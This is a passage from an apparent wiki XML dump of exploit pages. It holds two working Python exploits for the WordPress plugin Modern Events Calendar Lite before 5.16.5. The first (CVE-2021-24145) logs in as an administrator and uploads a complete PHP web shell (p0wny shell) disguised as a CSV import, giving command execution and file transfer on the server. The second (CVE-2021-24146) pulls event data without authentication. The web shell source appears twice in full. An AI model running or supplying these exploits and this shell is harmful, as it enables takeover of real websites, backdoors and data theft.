Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------29650037893637916779865254589\r\nContent-Disposition: form-data; name=\"mec-ix-action\"\r\n\r\nimport-start-bookings\r\n-----------------------------29650037893637916779865254589--\r\n"

# Exploit
session.post(exploit_url, headers=header, data=body)
print('')
print('[+] Shell Uploaded to: ' + 'http://' + target_ip + ':' + target_port + wp_path + '/wp-content/uploads/shell.php')
print('')
&lt;/pre&gt;</text>
      <sha1>bchreljauvfidqhlmoesovjwt1l0zj5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24145 Wordpress Plugin Modern Events Calendar 5.16.2 遠程代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>5390</id>
    <revision>
      <id>6185</id>
      <timestamp>2021-07-03T02:00:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Affected Versions=="</comment>
      <origin>6185</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="22130" sha1="d8ri1hpperyle7suopx3qpr3faq0fw6" xml:space="preserve">&lt;languages /&gt;
==Affected Versions==
Version: Before 5.16.5


==EXP==
&lt;pre&gt;
# Exploit Title: Wordpress Plugin Modern Events Calendar 5.16.2 - Remote Code Execution (Authenticated)
# Date 01.07.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://webnus.net/modern-events-calendar/
# Software Link: https://downloads.wordpress.org/plugin/modern-events-calendar-lite.5.16.2.zip
# Version: Before 5.16.5
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24145
# CWE: CWE-434
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24145/README.md

'''
Description:
Arbitrary file upload in the Modern Events Calendar Lite WordPress plugin, versions before 5.16.5,
did not properly check the imported file, allowing PHP ones to be uploaded by administrator by using the 'text/csv'
content-type in the request.
'''


'''
Banner:
'''
banner = """
  ______     _______     ____   ___ ____  _      ____  _  _   _ _  _  ____  
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |    |___ \| || | / | || || ___| 
| |    \ \ / /|  _| _____ __) | | | |__) | |_____ __) | || |_| | || ||___ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____/ __/|__   _| |__   _|__) |
 \____|  \_/  |_____|   |_____|\___/_____|_|    |_____|  |_| |_|  |_||____/ 
                                
                * Wordpress Plugin Modern Events Calendar Lite RCE                                                        
                * @Hacker5preme
                    

"""
print(banner)

'''
Import required modules:
'''
import requests
import argparse

'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Modern Events Calenar Lite RCE (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')

'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log': username,
    'pwd': password,
    'wp-submit': 'Log In',
    'testcookie': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
auth_header = auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print('[+] Authentication successfull !')
else:
    print('[-] Authentication failed !')
    exit()


'''
Exploit:
'''
exploit_url = "http://" + target_ip + ':' + target_port + wp_path + "wp-admin/admin.php?page=MEC-ix&amp;tab=MEC-import"

# Exploit Header:
header = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "multipart/form-data; boundary=---------------------------29650037893637916779865254589",
    "Origin": "http://" + target_ip,
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

# Exploit Body: (using p0wny shell: https://github.com/flozz/p0wny-shell
body = "-----------------------------29650037893637916779865254589\r\nContent-Disposition: form-data; name=\"feed\"; filename=\"shell.php\"\r\nContent-Type: text/csv\r\n\r\n&lt;?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2&gt;&amp;1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2&gt;&amp;1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" =&gt; $stdout,\n        \"cwd\" =&gt; getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" =&gt; getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' =&gt; $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' =&gt; array('File not found / no read permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        return array(\n            'name' =&gt; basename($filePath),\n            'file' =&gt; base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' =&gt; array('Invalid path / no write permission.'),\n            'cwd' =&gt; getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' =&gt; array('Done.'),\n            'cwd' =&gt; getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2&gt;/', $cmd)) {\n                $cmd .= ' 2&gt;&amp;1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?&gt;&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n    &lt;head&gt;\n        &lt;meta charset=\"UTF-8\" /&gt;\n        &lt;title&gt;p0wny@shell:~#&lt;/title&gt;\n        &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n        &lt;style&gt;\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt &gt; span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input &gt; label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        &lt;/style&gt;\n\n        &lt;script&gt;\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '&lt;span class=\\\"shell-prompt\\\"&gt;' + genPrompt(CWD) + '&lt;/span&gt; ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -&gt; nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length &lt;= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length &gt; 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:&lt;span title=\\\"\" + cwd + \"\\\"&gt;\" + shortCwd + \"&lt;/span&gt;#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&amp;/g, \"&amp;\")\n                    .replace(/&lt;/g, \"&lt;\")\n                    .replace(/&gt;/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition &gt; 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition &gt;= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&amp;\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------29650037893637916779865254589\r\nContent-Disposition: form-data; name=\"mec-ix-action\"\r\n\r\nimport-start-bookings\r\n-----------------------------29650037893637916779865254589--\r\n"

# Exploit
session.post(exploit_url, headers=header, data=body)
print('')
print('[+] Shell Uploaded to: ' + 'http://' + target_ip + ':' + target_port + wp_path + '/wp-content/uploads/shell.php')
print('')
&lt;/pre&gt;</text>
      <sha1>d8ri1hpperyle7suopx3qpr3faq0fw6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-24146 Wordpress Plugin Modern Events Calendar 5.16.2 事件導出漏洞</title>
    <ns>0</ns>
    <id>5391</id>
    <revision>
      <id>6186</id>
      <timestamp>2021-07-03T02:01:45Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; Version: Before 5.16.5  ==EXP== &lt;pre&gt; # Exploit Title: Wordpress Plugin Modern Events Calendar 5.16.2 - Event export (U..."</comment>
      <origin>6186</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2795" sha1="iyybzphfdjcoz6b1xq8ftt4asx2ptyx" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
Version: Before 5.16.5

==EXP==
&lt;pre&gt;
# Exploit Title: Wordpress Plugin Modern Events Calendar 5.16.2 - Event export (Unauthenticated)
# Date 01.07.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://webnus.net/modern-events-calendar/
# Software Link: https://downloads.wordpress.org/plugin/modern-events-calendar-lite.5.16.2.zip
# Version: Before 5.16.5
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24146
# CWE: CWE-863, CWE-284
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24146/README.md

'''
Description:
Lack of authorisation checks in the Modern Events Calendar Lite WordPress plugin,
versions before 5.16.5, did not properly restrict access to the export files,
allowing unauthenticated users to exports all events data in CSV or XML format for example.
'''


'''
Banner:
'''
banner = """
   _______    ________    ___   ____ ___  ___     ___  __ __ _____ __  _____
  / ____/ |  / / ____/   |__ \ / __ \__ \&lt;  /    |__ \/ // /&lt;  / // / / ___/
 / /    | | / / __/________/ // / / /_/ // /_______/ / // /_/ / // /_/ __ \ 
/ /___  | |/ / /__/_____/ __// /_/ / __// /_____/ __/__  __/ /__  __/ /_/ / 
\____/  |___/_____/    /____/\____/____/_/     /____/ /_/ /_/  /_/  \____/  
                                                                                                                                                                                                                                                                                                          
            * WordPress Plugin Modern Events Calendar Lite &lt; 5.16.2 - Export Event Data (Unauthenticated)
            * @Hacker5preme                                                                                                                            
                            
"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse
import csv

'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Modern Events CalendarExport Event Data (Unauthenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH


'''
Exploit:
'''
print('')
print('[+] Exported Data: ')
print('')
exploit_url = 'http://' + target_ip + ':' + target_port + wp_path + '/wp-admin/admin.php?page=MEC-ix&amp;tab=MEC-export&amp;mec-ix-action=export-events&amp;format=csv'
answer = requests.get(exploit_url)
decoded_content = answer.content.decode('utf-8')
cr = csv.reader(decoded_content.splitlines(), delimiter=',')
my_list = list(cr)
for row in my_list:
    print(row)
&lt;/pre&gt;</text>
      <sha1>iyybzphfdjcoz6b1xq8ftt4asx2ptyx</sha1>
    </revision>
    <revision>
      <id>6187</id>
      <parentid>6186</parentid>
      <timestamp>2021-07-03T02:01:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6187</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2806" sha1="k1ct1pmndbtgj6km7fl75yaufa6kdfp" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
Version: Before 5.16.5

==EXP==
&lt;pre&gt;
# Exploit Title: Wordpress Plugin Modern Events Calendar 5.16.2 - Event export (Unauthenticated)
# Date 01.07.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://webnus.net/modern-events-calendar/
# Software Link: https://downloads.wordpress.org/plugin/modern-events-calendar-lite.5.16.2.zip
# Version: Before 5.16.5
# Tested on: Ubuntu 18.04
# CVE: CVE-2021-24146
# CWE: CWE-863, CWE-284
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/Wordpress/CVE-2021-24146/README.md

'''
Description:
Lack of authorisation checks in the Modern Events Calendar Lite WordPress plugin,
versions before 5.16.5, did not properly restrict access to the export files,
allowing unauthenticated users to exports all events data in CSV or XML format for example.
'''


'''
Banner:
'''
banner = """
   _______    ________    ___   ____ ___  ___     ___  __ __ _____ __  _____
  / ____/ |  / / ____/   |__ \ / __ \__ \&lt;  /    |__ \/ // /&lt;  / // / / ___/
 / /    | | / / __/________/ // / / /_/ // /_______/ / // /_/ / // /_/ __ \ 
/ /___  | |/ / /__/_____/ __// /_/ / __// /_____/ __/__  __/ /__  __/ /_/ / 
\____/  |___/_____/    /____/\____/____/_/     /____/ /_/ /_/  /_/  \____/  
                                                                                                                                                                                                                                                                                                          
            * WordPress Plugin Modern Events Calendar Lite &lt; 5.16.2 - Export Event Data (Unauthenticated)
            * @Hacker5preme                                                                                                                            
                            
"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse
import csv

'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin Modern Events CalendarExport Event Data (Unauthenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH


'''
Exploit:
'''
print('')
print('[+] Exported Data: ')
print('')
